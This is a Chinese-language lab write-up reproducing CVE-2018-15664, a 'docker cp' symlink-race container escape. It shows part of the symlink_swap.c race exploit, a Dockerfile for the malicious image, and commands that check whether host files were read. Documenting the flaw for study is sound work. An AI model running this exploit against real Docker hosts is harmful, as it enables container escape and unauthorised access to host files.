### CVE-2018-15664 - docker cp符号链接替换漏洞

参考：http://mayoterry.com/index.php/archives/69.html

https://www.geekby.site/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/



## 1.背景

docker cp命令是用于在docker创建的容器中与宿主机文件系统之间进行文件复制。

符号链接是类似于windows系统的快捷方式。

在linux中创建符号链接：``` ln -s target_path link_path ```

## 2.实验原理

漏洞影响的docker版本：docker 17.06.0-ce～17.12.1-ce:rc2，18.01.0-ce～18.06.1-ce:rc2

漏洞poc参考：https://seclists.org/oss-sec/2019/q2/131（Aleksa Sarai 公布）

来自SUSE安全团队的Aleksa Sarai公布了编号为CVE-2018-15664的docker相关高危安全漏洞，该漏洞的CVSS评分为8.7，影响面涵盖所有docker发行版本【注: 指漏洞发布时的所有docker版本】，攻击者可利用该漏洞逃逸出容器读取或篡改host或其他任意容器内的文件。

CVE-2018-15664 实际上是一个 `TOCTOU`(time-of-check to time-of-use) 的问题。当用户执行 `docker cp` 命令后，Docker 守护进程接收到请求，会对用户给出的复制路径进行检查。如果路径中有容器内部的符号链接，则先在容器内部将其解析成对应的路径字符串，留待后用。

如果在 Docker 守护进程检查复制路径时，攻击者在这里先放置一个非符号链接的的常规文件或目录，检查结束后，攻击者在 Docker 守护进程使用路径前将其替换为一个符号链接，那么这个符号链接就会被打开时在宿主机上解析，从而导致目录穿越。

## 3.实验准备

使用metarget搭建 CVE-2018-15664环境：

### 3.1 安装metarget

metarget目前仅支持在Ubuntu 16.04和18.04安装运行，在20.04上可能会遇到依赖项问题。

此实验是在ubuntu18.04上进行。

git clone https://github.com/brant-ruan/metarget.git

cd metarget/

pip3 install -r requirements.txt

安装成功之后，使用metarget安装cve-2018-15664的实验环境

### 3.2 搭建CVE-2018-15664环境

`./metarget cnv install cve-2018-15664`

### 3.3 下载poc

wget https://github.com/Metarget/cloud-native-security-book/tree/main/code/0302-%E5%BC%80%E5%8F%91%E4%BE%A7%E6%94%BB%E5%87%BB/02-CVE-2018-15664/symlink_race

![image-20211123102836464](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211123102836464.png)

## 4.实验步骤

### 4.1 编译symlink_swap.c

cd build

cat symlink_swap.c

```c
/*
     * Now create a symlink to "/" (which will resolve to the host's root if we
     * win the race) and a dummy directory at stash_path for us to swap with.
     * We use a directory to remove the possibility of ENOTDIR which reduces
     * the chance of us winning.
     */
    if (symlink("/", symlink_path) < 0)
        bail("create symlink_path");
    if (mkdir(stash_path, 0755) < 0)
        bail("mkdir stash_path");

    /* Now we do a RENAME_EXCHANGE forever. */
    for (;;) {
        int err = rrenameat2(AT_FDCWD, symlink_path,
                            AT_FDCWD, stash_path, RENAME_EXCHANGE);
        if (err < 0)
            perror("symlink_swap: rename exchange failed");
    }
    return 0;
}

```

symlink_path 为 argv[1]传递过来的参数，例如目录 `/totally_safe_path` ，然后使用 symlink函数将symlink_path 软链接至系统根目录 / 。最后使用 `for (;;)`死循环调用rrenameat2 函数，创造赢得 TOCTOU 攻击的机会。

`gcc symlink_swap.c -o symlink_swap`

![image-20211123103442418](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211123103442418.png)

### 4.2 修改Dockerfile

Dockerfile的主要内容是构建漏洞利用程序，并将其放在容器的根目录下，并在根目录下创建一个 `w00t_w00t_im_a_flag` 文件，内容为：`FAILED -- INSIDE CONTAINER PATH`。容器启动后执行的程序(`Entrypoint`) 即为：symlink_swap

构建镜像时，在容器内安装 gcc 时报错，可以先在宿主机将 symlink_swap 编译好，再 COPY 到容器中。

修改之后的Dockerfile

```dockerfile
# Build the binary.
FROM opensuse/tumbleweed
# RUN zypper in -y gcc glibc-devel-static
RUN mkdir /builddir
COPY symlink_swap.c /builddir/symlink_swap.c
# RUN gcc -Wall -Werror -static -lpthread -o /builddir/symlink_swap /builddir/symlink_swap.c
COPY symlink_swap /builddir/symlink_swap

# Set up our malicious rootfs.
FROM opensuse/tumbleweed
ARG SYMSWAP_TARGET=/w00t_w00t_im_a_flag
ARG SYMSWAP_PATH=/totally_safe_path
RUN echo "FAILED -- INSIDE CONTAINER PATH" >"$SYMSWAP_TARGET"
COPY --from=0 /builddir/symlink_swap /symlink_swap
ENTRYPOINT ["/symlink_swap"]
```

### 4.3 执行run_read.sh（读取宿主机内容）

```bash
./run_read.sh &>/dev/null &
chmod 0644 ex*/out
grep 'SUCCESS' ex*/out | wc -l
grep 'FAILED'  ex*/out | wc -l
```

![image-20211123110614205](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211123110614205.png)

如果grep 'SUCCESS' ex*/out | wc -l显示的数值>0则表示在容器里成功的读取到了host主机的文件内容。







